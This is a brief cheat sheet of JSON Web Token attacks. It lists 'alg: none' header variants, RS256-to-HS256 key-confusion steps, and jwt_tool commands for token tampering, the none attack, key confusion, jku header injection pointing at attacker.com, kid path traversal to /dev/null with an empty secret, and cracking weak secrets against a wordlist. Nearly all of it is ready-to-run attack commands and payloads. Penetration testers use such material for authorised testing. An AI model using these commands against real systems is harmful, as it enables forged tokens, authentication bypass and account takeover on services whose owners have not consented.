# === ALGORITHM ATTACKS ===
# None algorithm (set alg: none)
# Header: {"alg":"none","typ":"JWT"}
# Header: {"alg":"None","typ":"JWT"}
# Header: {"alg":"NONE","typ":"JWT"}
# Header: {"alg":"nOnE","typ":"JWT"}

# RS256 to HS256 confusion
# 1. Get public key from /jwks.json, /.well-known/jwks.json
# 2. Sign token with public key using HS256
# Header change: {"alg":"RS256"} → {"alg":"HS256"}

# === JWT_TOOL COMMANDS ===
# Basic tampering
jwt_tool <token> -T

# Algorithm none attack
jwt_tool <token> -X a

# Key confusion attack (use public key as HMAC secret)
jwt_tool <token> -X k -pk public.pem

# Inject via jku header
jwt_tool <token> -X s -ju https://attacker.com/jwks.json

# Inject via kid header
jwt_tool <token> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""

# Crack weak secret
jwt_tool <token> -C -d wordlist.txt
